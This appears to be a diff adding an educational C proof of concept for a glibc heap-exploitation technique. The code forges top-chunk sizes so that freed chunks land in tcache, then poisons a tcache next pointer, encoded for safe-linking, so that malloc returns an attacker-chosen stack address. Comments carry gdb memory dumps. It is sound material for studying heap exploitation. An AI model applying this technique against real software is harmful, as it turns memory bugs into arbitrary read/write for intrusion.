@@ -1,0 +1,157 @@
+57  char win[0x10] = "WIN\0WIN\0WIN\0\x06\xfe\x1b\xe2";
+77  target = ((size_t) win + (MALLOC_ALIGN - 1)) & MALLOC_MASK;  // up_align(win, 0x10)
+
+81  heap_ptr = malloc(PROBE);
+82  top_size = heap_ptr[(PROBE / SIZE_SZ) + 1];
+
+87  size_2 = top_size - CHUNK_HDR_SZ - (2 * MALLOC_ALIGN) - CHUNK_SIZE_1;
+88  size_2 &= PAGE_MASK;
+89  size_2 &= MALLOC_MASK;
+
+95  heap_ptr = malloc(size_2);
+
+98  top_size_ptr = &heap_ptr[(size_2 / SIZE_SZ) - 1 + (MALLOC_ALIGN / SIZE_SZ)];
+100 top_size = *top_size_ptr;
+106 new_top_size = top_size & PAGE_MASK;
+107 *top_size_ptr = new_top_size;
+  
+112 freed_top_size = (new_top_size - FENCEPOST) & MALLOC_MASK;
+113 assert(freed_top_size == CHUNK_SIZE_1);
+
+124 heap_ptr = malloc(SIZE_3);
+126 top_size = heap_ptr[(SIZE_3 / SIZE_SZ) + 1];
+130 new_top_size = top_size & PAGE_MASK;
+131 heap_ptr[(SIZE_3 / SIZE_SZ) + 1] = new_top_size;
+
+135 freed_top_size = (new_top_size - FENCEPOST) & MALLOC_MASK;
+138 assert(freed_top_size == CHUNK_SIZE_1);
+  
+141 vuln_tcache = (size_t) &heap_ptr[(SIZE_3 / SIZE_SZ) + 2];
+146 heap_ptr = malloc(SIZE_3);
+150 heap_ptr[(vuln_tcache - (size_t) heap_ptr) / SIZE_SZ] = target ^ (vuln_tcache >> 12);
+  
+153 heap_ptr = malloc(SIZE_1);
+156 heap_ptr = malloc(SIZE_1);
+
+
+
+
+
+
+
+
+
+
+
+
+#define _GNU_SOURCE
+#include <stdio.h>
+#include <string.h>
+#include <assert.h>
+#include <malloc.h>
+#include <unistd.h>
+
+#define SIZE_SZ sizeof(size_t)
+#define CHUNK_HDR_SZ (SIZE_SZ*2)
+
+#define MALLOC_ALIGN 0x10L
+#define MALLOC_MASK (-MALLOC_ALIGN)
+
+#define PAGESIZE sysconf(_SC_PAGESIZE)
+#define PAGE_MASK (PAGESIZE-1)
+
+#define FENCEPOST (2*CHUNK_HDR_SZ)
+
+#define PROBE (0x20-CHUNK_HDR_SZ)
+
+#define CHUNK_SIZE_1 0x40
+#define SIZE_1 (CHUNK_SIZE_1-CHUNK_HDR_SZ)
+
+#define CHUNK_SIZE_3 (PAGESIZE-(2*MALLOC_ALIGN)-CHUNK_SIZE_1)
+#define SIZE_3 (CHUNK_SIZE_3-CHUNK_HDR_SZ)
+
+
+int main() {
+  size_t size_2, *top_size_ptr, top_size, new_top_size, freed_top_size, vuln_tcache, target, *heap_ptr;
+  char win[0x10] = "WIN\0WIN\0WIN\0\x06\xfe\x1b\xe2";
+
+  target = ((size_t) win + (MALLOC_ALIGN - 1)) & MALLOC_MASK;
+
+  heap_ptr = malloc(PROBE);
+  top_size = heap_ptr[(PROBE / SIZE_SZ) + 1];
+
+  // size_2 = 0xce0
+  //       0x20d51    0x10            0x20                0x40
+  size_2 = top_size - CHUNK_HDR_SZ - (2 * MALLOC_ALIGN) - CHUNK_SIZE_1;
+  size_2 &= PAGE_MASK;
+  size_2 &= MALLOC_MASK;
+
+  /*
+   *  (gdb) x/4gx heap_ptr-2
+   *  0x4052b0:    0x0000000000000000    0x0000000000000cf1
+   *  0x4052c0:    0x0000000000000000    0x0000000000000000
+  */
+  heap_ptr = malloc(size_2);
+
+  /*
+   * (gdb) x/4gx top_size_ptr-1
+   * 0x405fa0:    0x0000000000000000    0x0000000000020061 (-> 0x61)
+   * 0x405fb0:    0x0000000000000000    0x0000000000000000
+  */
+  top_size_ptr = &heap_ptr[(size_2 / SIZE_SZ) - 1 + (MALLOC_ALIGN / SIZE_SZ)];
+  top_size = *top_size_ptr;
+  new_top_size = top_size & PAGE_MASK;
+  *top_size_ptr = new_top_size;
+
+  // freed_top_size = 0x40
+  //                0x61           0x20
+  freed_top_size = (new_top_size - FENCEPOST) & MALLOC_MASK;
+  assert(freed_top_size == CHUNK_SIZE_1);
+
+  /*
+   * (gdb) x/4gx heap_ptr-2
+   * 0x426000:    0x0000000000000000    0x0000000000000fa1
+   * 0x426010:    0x0000000000000000    0x0000000000000000
+  */
+  // _int_free(top_size_ptr-1)
+  heap_ptr = malloc(SIZE_3);
+
+  /*
+   * (gdb) x/4gx heap_ptr+0x1f2
+   * 0x426fa0:    0x0000000000000000    0x0000000000021061 (-> 0x61)
+   * 0x426fb0:    0x0000000000000000    0x0000000000000000
+   *                 ^
+   *              vuln_tcache
+  */
+  top_size = heap_ptr[(SIZE_3 / SIZE_SZ) + 1];
+  new_top_size = top_size & PAGE_MASK;
+  heap_ptr[(SIZE_3 / SIZE_SZ) + 1] = new_top_size;
+
+  // freed_top_size = 0x40
+  //                0x61           0x20
+  freed_top_size = (new_top_size - FENCEPOST) & MALLOC_MASK;
+  assert(freed_top_size == CHUNK_SIZE_1);
+
+  vuln_tcache = (size_t) &heap_ptr[(SIZE_3 / SIZE_SZ) + 2];
+
+  /*
+   * (gdb) x/4gx heap_ptr-2
+   * 0x448000:    0x0000000000000000    0x0000000000000fa1
+   * 0x448010:    0x0000000000000000    0x0000000000000000
+  */
+  // _int_free(heap_ptr+0x1f2)
+  heap_ptr = malloc(SIZE_3);
+
+  // corrupt next ptr into pointing to target !!
+  heap_ptr[(vuln_tcache - (size_t) heap_ptr) / SIZE_SZ] = target ^ (vuln_tcache >> 12);
+
+  // allocate first tcache (corrupt next tcache bin)
+  heap_ptr = malloc(SIZE_1);
+
+  // get arbitrary ptr for reads or writes
+  heap_ptr = malloc(SIZE_1);
+
+  // proof that heap_ptr now points to the same string as target
+  assert((size_t) heap_ptr == target);
+  puts((char *) heap_ptr);
+}
